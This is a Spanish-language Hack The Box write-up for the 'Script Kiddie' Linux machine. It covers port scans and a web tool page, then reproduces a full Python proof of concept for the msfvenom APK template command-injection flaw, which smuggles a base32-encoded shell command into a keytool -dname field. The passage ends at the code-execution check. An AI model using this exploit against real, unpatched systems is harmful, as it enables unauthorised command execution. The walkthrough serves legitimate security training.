---
title: "Script Kiddie - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ScriptKiddie/data/Scriptkiddie.png"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/Hackthebox2.png?raw=true"
categories:
  - Writeup
  - HackTheBox
tags:
  -
  -
  -
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ScriptKiddie/data/scriptkiddie.png">
</p>

La máquina **Script Kiddie** es una máquina virtual vulnerable de la plataforma **HackTheBox** con un nivel de dificultad **facil** una calificación en el rank de 4.1, **5039 USER OWNS** y **4475 SYSTEM OWNS** con la ip **10.10.10.226** y un sistema operativo **Linux**.


# Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.226]** utilizando los parámetros:
 - **-p-:**    Escaneo a toda la gama de puertos (65536).
 - **-n:**     No hacen la resolución del DNS.
 - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
 - **-v:**     Aumenta el nivel de los mensajes verbose.
 - **--open:** Muestra sólo los puertos con un estatus abierto.
 - **-oG:**    Guarda la el output en formato Grepeable.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/scan/scanPort.png?raw=true">
</p>

Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **22,5000**:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/scan/Ports.png?raw=true">
</p>

Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

 - -sC: Script de enumeración básica de sondeo en puertos y servicios alojados.
 - -sV: Detección de versiones en servicios alojados en puertos.
 - -p : Puertos a inspeccionar.
 - -oN: Formatos de Nmap en los que se guardará el archivo.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/scan/PortServ.png?raw=true">
</p>

Gracias a lo que nos mostró el escaneo de servicios y versiones se puede ver que en el puerto **5000** se encuentra un servicio **http** y en el puerto **22** un servicio **ssh**, sabiendo esto y yendo a un navegador e ingresando al servicio **http** por el puerto **5000** se puede ver la siguiente web.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/scan/web2.png?raw=true">
</p>

Es una web que cuenta con diferentes herramientas de pentesting como **nmap**, **msfvenom** y **searchsploit**.
Algo que podemos notar es que en la herramienta implementada de **msfvenom** se pueden subir **template**, investigando se puede llegar a un articulo el cual explica una vulnerabilidad existente en una version [desactualizada del framework de metasploit](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/).

En ella se habla de como hacerlo con la herramienta de **metasploit** pero no es necesario ya que podemos hacer uso del siguiente código en python que saque de el [github de justinsteven ](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md).
```python
#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b32encode

# Change me
payload = 'echo "Code execution as $(id)" > /tmp/win'

# b32encode to avoid badchars (keytool is picky)
# thanks to @fdellwing for noticing that base64 can sometimes break keytool
# <https://github.com/justinsteven/advisories/issues/2>
payload_b32 = b32encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b32} | base32 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
```
En este codigo solo tenemos que cambiar el payload del apk maliciosos que generaremos, en este caso yo me enviare 5 paquetes icmp y los para verificar si tengo ejecucion de comando examinare los paquetes con **tcpdum**

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/exp1.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/exp2.png?raw=true">
</p>
